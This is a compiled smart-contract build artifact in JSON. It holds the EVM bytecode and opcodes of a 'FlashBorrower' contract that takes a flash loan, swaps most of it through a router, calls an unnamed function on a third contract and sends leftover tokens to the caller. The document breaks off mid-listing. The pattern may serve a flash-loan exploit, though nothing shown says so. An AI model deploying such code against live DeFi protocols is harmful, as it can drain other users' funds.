{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b50604051610b38380380610b3883398101604081905261002f91610071565b600080546001600160a01b039485166001600160a01b0319918216179091556001805493851693821693909317909255600280549190931691161790556100d6565b60008060006060848603121561008657600080fd5b8351610091816100be565b60208501519093506100a2816100be565b60408501519092506100b3816100be565b809150509250925092565b6001600160a01b03811681146100d357600080fd5b50565b610a53806100e56000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806308c364551461003b578063f3a7810414610050575b600080fd5b61004e6100493660046107ce565b610075565b005b61006361005e36600461078c565b61021e565b60405190815260200160405180910390f35b600380546001600160a01b0319166001600160a01b0383811691909117909155600054604051639d9638a160e01b8152306004820152858316602482015260448101859052911690639d9638a190606401602060405180830381600087803b1580156100e057600080fd5b505af11580156100f4573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011891906108cf565b506040516370a0823160e01b81523060048201526001600160a01b0384169063a9059cbb90339083906370a082319060240160206040518083038186803b15801561016257600080fd5b505afa158015610176573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061019a91906108f8565b6040516001600160e01b031960e085901b1681526001600160a01b0390921660048301526024820152604401602060405180830381600087803b1580156101e057600080fd5b505af11580156101f4573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061021891906108cf565b50505050565b600080546001600160a01b0316331461027e5760405162461bcd60e51b815260206004820152601f60248201527f466c617368426f72726f7765723a20556e74727573746564206c656e6465720060448201526064015b60405180910390fd5b6001600160a01b03851630146102e65760405162461bcd60e51b815260206004820152602760248201527f466c617368426f72726f7765723a20556e74727573746564206c6f616e20696e60448201526634ba34b0ba37b960c91b6064820152608401610275565b60006102f360648561099a565b6102fe90605a6109bc565b60408051600280825260608201835292935060009290916020830190803683370190505090508581600081518110610338576103386109f1565b6001600160a01b039283166020918202929092010152600354825191169082906001908110610369576103696109f1565b6001600160a01b03928316602091820292909201015260015460405163095ea7b360e01b81529082166004820152602481018490529087169063095ea7b390604401602060405180830381600087803b1580156103c557600080fd5b505af11580156103d9573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103fd91906108cf565b506001546001600160a01b03166338ed173983670de0b6b3a76400008430610426426064610982565b6040518663ffffffff1660e01b8152600401610446959493929190610911565b600060405180830381600087803b15801561046057600080fd5b505af1158015610474573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261049c919081019061080a565b506003546040516370a0823160e01b815230600482015287916001600160a01b03169060009082906370a082319060240160206040518083038186803b1580156104e557600080fd5b505afa1580156104f9573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061051d91906108f8565b60025460405163095ea7b360e01b81526001600160a01b0391821660048201526024810183905291925083169063095ea7b390604401602060405180830381600087803b15801561056d57600080fd5b505af1158015610581573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105a591906108cf565b5060025460405163030e408960e51b81526001600160a01b038581166004830152848116602483015260448201849052909116906361c8112090606401600060405180830381600087803b1580156105fc57600080fd5b505af1158015610610573d6000803e3d6000fd5b505060008054604051636eb1769f60e11b81523060048201526001600160a01b0391821660248201529193508c16915063dd62ed3e9060440160206040518083038186803b15801561066157600080fd5b505afa158015610675573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061069991906108f8565b905060006106a7898b610982565b905060006106b58284610982565b60005460405163095ea7b360e01b81526001600160a01b039182166004820152602481018390529192508d169063095ea7b390604401602060405180830381600087803b15801561070557600080fd5b505af1158015610719573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061073d91906108cf565b507f439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd99d9c50505050505050505050505050565b80356001600160a01b038116811461078757600080fd5b919050565b600080600080608085870312156107a257600080fd5b6107ab85610770565b93506107b960208601610770565b93969395505050506040820135916060013590565b6000806000606084860312156107e357600080fd5b6107ec84610770565b92506020840135915061080160408501610770565b90509250925092565b6000602080838503121561081d57600080fd5b825167ffffffffffffffff8082111561083557600080fd5b818501915085601f83011261084957600080fd5b81518181111561085b5761085b610a07565b8060051b604051601f19603f8301168101818110858211171561088057610880610a07565b604052828152858101935084860182860187018a101561089f57600080fd5b600095505b838610156108c25780518552600195909501949386019386016108a4565b5098975050505050505050565b6000602082840312156108e157600080fd5b815180151581146108f157600080fd5b9392505050565b60006020828403121561090a57600080fd5b5051919050565b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b818110156109615784516001600160a01b03168352938301939183019160010161093c565b50506001600160a01b03969096166060850152505050608001529392505050565b60008219821115610995576109956109db565b500190565b6000826109b757634e487b7160e01b600052601260045260246000fd5b500490565b60008160001904831182151516156109d6576109d66109db565b500290565b634e487b7160e01b600052601160045260246000fd5b634e487b7160e01b600052603260045260246000fd5b634e487b7160e01b600052604160045260246000fdfea2646970667358221220f2dfe33b0d79522f691abd10df898889f954aa2a7de270a67bd7f18989498f1564736f6c63430008070033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xB38 CODESIZE SUB DUP1 PUSH2 0xB38 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x2F SWAP2 PUSH2 0x71 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x1 DUP1 SLOAD SWAP4 DUP6 AND SWAP4 DUP3 AND SWAP4 SWAP1 SWAP4 OR SWAP1 SWAP3 SSTORE PUSH1 0x2 DUP1 SLOAD SWAP2 SWAP1 SWAP4 AND SWAP2 AND OR SWAP1 SSTORE PUSH2 0xD6 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x86 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 MLOAD PUSH2 0x91 DUP2 PUSH2 0xBE JUMP JUMPDEST PUSH1 0x20 DUP6 ADD MLOAD SWAP1 SWAP4 POP PUSH2 0xA2 DUP2 PUSH2 0xBE JUMP JUMPDEST PUSH1 0x40 DUP6 ADD MLOAD SWAP1 SWAP3 POP PUSH2 0xB3 DUP2 PUSH2 0xBE JUMP JUMPDEST DUP1 SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0xD3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0xA53 DUP1 PUSH2 0xE5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8C36455 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xF3A78104 EQ PUSH2 0x50 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x49 CALLDATASIZE PUSH1 0x4 PUSH2 0x7CE JUMP JUMPDEST PUSH2 0x75 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x63 PUSH2 0x5E CALLDATASIZE PUSH1 0x4 PUSH2 0x78C JUMP JUMPDEST PUSH2 0x21E JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 DUP2 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x9D9638A1 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE DUP6 DUP4 AND PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 DUP2 ADD DUP6 SWAP1 MSTORE SWAP2 AND SWAP1 PUSH4 0x9D9638A1 SWAP1 PUSH1 0x64 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x118 SWAP2 SWAP1 PUSH2 0x8CF JUMP JUMPDEST POP PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND SWAP1 PUSH4 0xA9059CBB SWAP1 CALLER SWAP1 DUP4 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x162 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x176 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x19A SWAP2 SWAP1 PUSH2 0x8F8 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB NOT PUSH1 0xE0 DUP6 SWAP1 SHL AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND PUSH1 0x4 DUP4 ADD MSTORE PUSH1 0x24 DUP3 ADD MSTORE PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1F4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x218 SWAP2 SWAP1 PUSH2 0x8CF JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x27E JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x466C617368426F72726F7765723A20556E74727573746564206C656E64657200 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND ADDRESS EQ PUSH2 0x2E6 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x27 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x466C617368426F72726F7765723A20556E74727573746564206C6F616E20696E PUSH1 0x44 DUP3 ADD MSTORE PUSH7 0x34BA34B0BA37B9 PUSH1 0xC9 SHL PUSH1 0x64 DUP3 ADD MSTORE PUSH1 0x84 ADD PUSH2 0x275 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2F3 PUSH1 0x64 DUP6 PUSH2 0x99A JUMP JUMPDEST PUSH2 0x2FE SWAP1 PUSH1 0x5A PUSH2 0x9BC JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x2 DUP1 DUP3 MSTORE PUSH1 0x60 DUP3 ADD DUP4 MSTORE SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 SWAP1 SWAP2 PUSH1 0x20 DUP4 ADD SWAP1 DUP1 CALLDATASIZE DUP4 CALLDATACOPY ADD SWAP1 POP POP SWAP1 POP DUP6 DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x338 JUMPI PUSH2 0x338 PUSH2 0x9F1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND PUSH1 0x20 SWAP2 DUP3 MUL SWAP3 SWAP1 SWAP3 ADD ADD MSTORE PUSH1 0x3 SLOAD DUP3 MLOAD SWAP2 AND SWAP1 DUP3 SWAP1 PUSH1 0x1 SWAP1 DUP2 LT PUSH2 0x369 JUMPI PUSH2 0x369 PUSH2 0x9F1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 DUP4 AND PUSH1 0x20 SWAP2 DUP3 MUL SWAP3 SWAP1 SWAP3 ADD ADD MSTORE PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE SWAP1 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP5 SWAP1 MSTORE SWAP1 DUP8 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3C5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3D9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x3FD SWAP2 SWAP1 PUSH2 0x8CF JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x38ED1739 DUP4 PUSH8 0xDE0B6B3A7640000 DUP5 ADDRESS PUSH2 0x426 TIMESTAMP PUSH1 0x64 PUSH2 0x982 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x446 SWAP6 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x911 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x460 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x474 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY PUSH1 0x1F RETURNDATASIZE SWAP1 DUP2 ADD PUSH1 0x1F NOT AND DUP3 ADD PUSH1 0x40 MSTORE PUSH2 0x49C SWAP2 SWAP1 DUP2 ADD SWAP1 PUSH2 0x80A JUMP JUMPDEST POP PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE DUP8 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH1 0x0 SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4E5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x4F9 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x51D SWAP2 SWAP1 PUSH2 0x8F8 JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP4 SWAP1 MSTORE SWAP2 SWAP3 POP DUP4 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x56D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x581 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x5A5 SWAP2 SWAP1 PUSH2 0x8CF JUMP JUMPDEST POP PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0x30E4089 PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x4 DUP4 ADD MSTORE DUP5 DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP3 ADD DUP5 SWAP1 MSTORE SWAP1 SWAP2 AND SWAP1 PUSH4 0x61C81120 SWAP1 PUSH1 0x64 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x5FC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x610 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x6EB1769F PUSH1 0xE1 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x24 DUP3 ADD MSTORE SWAP2 SWAP4 POP DUP13 AND SWAP2 POP PUSH4 0xDD62ED3E SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x661 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x675 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x699 SWAP2 SWAP1 PUSH2 0x8F8 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x6A7 DUP10 DUP12 PUSH2 0x982 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x6B5 DUP3 DUP5 PUSH2 0x982 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP4 SWAP1 MSTORE SWAP2 SWAP3 POP DUP14 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x705 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x719 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x73D SWAP2 SWAP1 PUSH2 0x8CF JUMP JUMPDEST POP PUSH32 0x439148F0BBC682CA079E46D6E2C2F0C1E3B820F1A291B069D8882ABF8CF18DD9 SWAP14 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP JUMP JUMPDEST DUP1 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x787 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x7A2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x7AB DUP6 PUSH2 0x770 JUMP JUMPDEST SWAP4 POP PUSH2 0x7B9 PUSH1 0x20 DUP7 ADD PUSH2 0x770 JUMP JUMPDEST SWAP4 SWAP7 SWAP4 SWAP6 POP POP POP POP PUSH1 0x40 DUP3 ADD CALLDATALOAD SWAP2 PUSH1 0x60 ADD CALLDATALOAD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x7E3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x7EC DUP5 PUSH2 0x770 JUMP JUMPDEST SWAP3 POP PUSH1 0x20 DUP5 ADD CALLDATALOAD SWAP2 POP PUSH2 0x801 PUSH1 0x40 DUP6 ADD PUSH2 0x770 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP1 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x81D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP1 DUP3 GT ISZERO PUSH2 0x835 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP6 ADD SWAP2 POP DUP6 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x849 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP2 DUP2 GT ISZERO PUSH2 0x85B JUMPI PUSH2 0x85B PUSH2 0xA07 JUMP JUMPDEST DUP1 PUSH1 0x5 SHL PUSH1 0x40 MLOAD PUSH1 0x1F NOT PUSH1 0x3F DUP4 ADD AND DUP2 ADD DUP2 DUP2 LT DUP6 DUP3 GT OR ISZERO PUSH2 0x880 JUMPI PUSH2 0x880 PUSH2 0xA07 JUMP JUMPDEST PUSH1 0x40 MSTORE DUP3 DUP2 MSTORE DUP6 DUP2 ADD SWAP4 POP DUP5 DUP7 ADD DUP3 DUP7 ADD DUP8 ADD DUP11 LT ISZERO PUSH2 0x89F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 SWAP6 POP JUMPDEST DUP4 DUP7 LT ISZERO PUSH2 0x8C2 JUMPI DUP1 MLOAD DUP6 MSTORE PUSH1 0x1 SWAP6 SWAP1 SWAP6 ADD SWAP5 SWAP4 DUP7 ADD SWAP4 DUP7 ADD PUSH2 0x8A4 JUMP JUMPDEST POP SWAP9 SWAP8 POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x8E1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x8F1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x90A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xA0 DUP3 ADD DUP8 DUP4 MSTORE PUSH1 0x20 DUP8 DUP2 DUP6 ADD MSTORE PUSH1 0xA0 PUSH1 0x40 DUP6 ADD MSTORE DUP2 DUP8 MLOAD DUP1 DUP5 MSTORE PUSH1 0xC0 DUP7 ADD SWAP2 POP DUP3 DUP10 ADD SWAP4 POP PUSH1 0x0 JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x961 JUMPI DUP5 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 MSTORE SWAP4 DUP4 ADD SWAP4 SWAP2 DUP4 ADD SWAP2 PUSH1 0x1 ADD PUSH2 0x93C JUMP JUMPDEST POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP7 SWAP1 SWAP7 AND PUSH1 0x60 DUP6 ADD MSTORE POP POP POP PUSH1 0x80 ADD MSTORE SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 NOT DUP3 GT ISZERO PUSH2 0x995 JUMPI PUSH2 0x995 PUSH2 0x9DB JUMP JUMPDEST POP ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0x9B7 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 NOT DIV DUP4 GT DUP3 ISZERO ISZERO AND ISZERO PUSH2 0x9D6 JUMPI PUSH2 0x9D6 PUSH2 0x9DB JUMP JUMPDEST POP MUL SWAP1 JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLCODE 0xDF 0xE3 EXTCODESIZE 0xD PUSH26 